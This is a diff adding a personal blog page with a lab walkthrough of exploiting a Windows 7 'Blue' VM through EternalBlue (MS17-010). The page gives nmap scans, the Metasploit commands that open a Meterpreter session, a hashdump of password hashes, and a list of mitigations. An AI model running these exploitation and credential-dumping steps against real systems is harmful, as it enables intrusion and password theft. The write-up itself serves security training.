@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blue Walkthrough - Muhammad Mughees</title>
+    <link rel="stylesheet" href="../../styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .walkthrough-content {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 150px 20px 100px;
+        }
+        
+        .walkthrough-header {
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+        
+        .walkthrough-header h1 {
+            font-size: 3rem;
+            color: var(--heading-color);
+            margin-bottom: 1rem;
+        }
+        
+        .walkthrough-meta {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            color: var(--text-color);
+            margin-bottom: 2rem;
+        }
+        
+        .walkthrough-meta span {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        
+        .walkthrough-body {
+            background-color: var(--bg-light);
+            padding: 3rem;
+            border-radius: 10px;
+            line-height: 1.8;
+        }
+        
+        .walkthrough-body h2 {
+            color: var(--heading-color);
+            margin-top: 2rem;
+            margin-bottom: 1rem;
+            font-size: 2rem;
+        }
+        
+        .walkthrough-body h3 {
+            color: var(--accent-color);
+            margin-top: 1.5rem;
+            margin-bottom: 0.75rem;
+            font-size: 1.5rem;
+        }
+        
+        .walkthrough-body p {
+            color: var(--text-color);
+            margin-bottom: 1rem;
+        }
+        
+        .walkthrough-body strong {
+            color: var(--primary-color);
+        }
+        
+        .walkthrough-body code {
+            background-color: var(--bg-dark);
+            padding: 2px 8px;
+            border-radius: 4px;
+            color: var(--primary-color);
+            font-family: 'Courier New', monospace;
+        }
+        
+        .walkthrough-body pre {
+            background-color: var(--bg-dark);
+            padding: 1rem;
+            border-radius: 5px;
+            overflow-x: auto;
+            margin: 1rem 0;
+            border-left: 3px solid var(--primary-color);
+        }
+        
+        .walkthrough-body pre code {
+            background: none;
+            padding: 0;
+        }
+        
+        .walkthrough-body img {
+            width: 100%;
+            max-width: 700px;
+            border-radius: 10px;
+            margin: 2rem auto;
+            display: block;
+            border: 2px solid var(--bg-lighter);
+        }
+        
+        .walkthrough-body ul {
+            margin-left: 2rem;
+            margin-bottom: 1rem;
+        }
+        
+        .walkthrough-body li {
+            color: var(--text-color);
+            margin-bottom: 0.5rem;
+        }
+        
+        .back-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-bottom: 2rem;
+            color: var(--primary-color);
+            text-decoration: none;
+            transition: all 0.3s ease;
+        }
+        
+        .back-btn:hover {
+            transform: translateX(-5px);
+        }
+        
+        @media (max-width: 768px) {
+            .walkthrough-body {
+                padding: 1.5rem;
+            }
+            
+            .walkthrough-header h1 {
+                font-size: 2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="container">
+            <div class="logo">
+                <i class="fas fa-shield-alt"></i>
+                <span>Muhammad Mughees</span>
+            </div>
+            <ul class="nav-menu">
+                <li><a href="../../index.html">Home</a></li>
+                <li><a href="../../index.html#about">About</a></li>
+                <li><a href="../../index.html#services">Services</a></li>
+                <li><a href="../../index.html#skills">Skills</a></li>
+                <li><a href="../../blog.html" class="active">Blog</a></li>
+                <li><a href="../../index.html#contact">Contact</a></li>
+            </ul>
+            <div class="hamburger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Walkthrough Content -->
+    <div class="walkthrough-content">
+        <a href="../../blog.html" class="back-btn">
+            <i class="fas fa-arrow-left"></i> Back to Blog
+        </a>
+        
+        <div class="walkthrough-header">
+            <h1>Blue Machine Walkthrough</h1>
+            <div class="walkthrough-meta">
+                <span><i class="fas fa-calendar"></i> November 28, 2025</span>
+                <span><i class="fas fa-tag"></i> Walkthrough</span>
+                <span><i class="fas fa-shield-virus"></i> EternalBlue Exploit</span>
+            </div>
+        </div>
+
+        <div class="walkthrough-body">
+            <h2>Overview</h2>
+            <p>Blue is a Windows machine that has the infamous <strong>EternalBlue vulnerability</strong> (MS17-010). This walkthrough will guide you through the complete exploitation process from reconnaissance to gaining system access.</p>
+
+            <h2>Initial Setup</h2>
+            <p>First, import the machine in VMware or VirtualBox and set the network adapter to <strong>NAT Network</strong> to solve connectivity seamlessly.</p>
+            <ul>
+                <li><strong>Blue Admin Account Password:</strong> Password456!</li>
+                <li>Open CMD in Blue and type <code>ipconfig</code> to get the Blue IP address</li>
+                <li>Open terminal in Kali Linux and type <code>ifconfig</code> to find your Kali IP</li>
+                <li>Cross ping both machines to verify connectivity</li>
+            </ul>
+
+            <img src="1.png" alt="Network Configuration">
+
+            <h2>Reconnaissance</h2>
+            <p>Next, we'll scan for open ports using Network Mapper (Nmap):</p>
+            
+            <h3>Basic Scan</h3>
+            <pre><code>nmap 10.0.2.3</code></pre>
+
+            <img src="image.png" alt="Initial Nmap Scan">
+
+            <h3>Detailed Service Scan</h3>
+            <pre><code>nmap -p 135,139,445,5357 -A 10.0.2.3</code></pre>
+
+            <img src="image 1.png" alt="Detailed Nmap Scan Results">
+
+            <h2>Vulnerability Research</h2>
+            <p>After discovering the target is running <strong>Windows 7 Ultimate 7601 Service Pack 1</strong>, I searched for exploits related to this version.</p>
+            
+            <p>This version of Windows is vulnerable to the exploit called <strong>MS17-010</strong>, also known as <strong>EternalBlue</strong>. Since we found a Rapid7 result and Rapid7 owns Metasploit Framework, we'll use Metasploit for exploitation.</p>
+
+            <img src="image 2.png" alt="Exploit Research">
+
+            <h2>Exploitation Phase</h2>
+            
+            <h3>Starting Metasploit</h3>
+            <p>Open Metasploit Framework in Kali Linux:</p>
+            <pre><code>msfconsole</code></pre>
+
+            <h3>Searching for EternalBlue Exploit</h3>
+            <pre><code>search eternalblue
+use 0</code></pre>
+
+            <img src="image 4.png" alt="Metasploit EternalBlue Module">
+
+            <h3>Configuring the Exploit</h3>
+            <pre><code>show options
+set rhosts 10.0.2.3</code></pre>
+
+            <h3>Vulnerability Check</h3>
+            <p>Before exploiting, it's good practice to verify the target is vulnerable:</p>
+            <pre><code>check</code></pre>
+
+            <img src="image 5.png" alt="Vulnerability Check Result">
+
+            <p><strong>Result:</strong> The target appears to be vulnerable! ✅</p>
+
+            <h3>Running the Exploit</h3>
+            <pre><code>exploit</code></pre>
+            <p>or</p>
+            <pre><code>run</code></pre>
+
+            <img src="image 6.png" alt="Successful Exploitation">
+
+            <h2>Post-Exploitation</h2>
+            <p><strong>Congratulations!</strong> We have successfully exploited the Blue machine and obtained a Meterpreter session.</p>
+
+            <h3>Dumping User Hashes</h3>
+            <p>With system-level access, we can dump user password hashes:</p>
+            <pre><code>hashdump</code></pre>
+
+            <img src="image 7.png" alt="Hashdump Results">
+
+            <p>These hashes can be cracked offline using tools like John the Ripper or Hashcat (more on this in future walkthroughs).</p>
+
+            <h2>Key Takeaways</h2>
+            <ul>
+                <li><strong>EternalBlue (MS17-010)</strong> is a critical SMB vulnerability affecting older Windows systems</li>
+                <li>Always perform thorough reconnaissance using tools like Nmap</li>
+                <li>Use the <code>check</code> command in Metasploit to verify vulnerability before exploitation</li>
+                <li>Keep systems patched and updated to prevent exploitation of known vulnerabilities</li>
+                <li>The hashdump command provides valuable credential information for further network penetration</li>
+            </ul>
+
+            <h2>Mitigation</h2>
+            <p>To protect against EternalBlue attacks:</p>
+            <ul>
+                <li>Install Microsoft Security Bulletin MS17-010 patch</li>
+                <li>Disable SMBv1 protocol</li>
+                <li>Implement network segmentation</li>
+                <li>Use a firewall to block unnecessary SMB ports (139, 445)</li>
+                <li>Keep all Windows systems updated with the latest security patches</li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 Muhammad Mughees. All rights reserved.</p>
+        </div>
+    </footer>
+
+    <script src="../../script.js"></script>
+</body>
+</html>
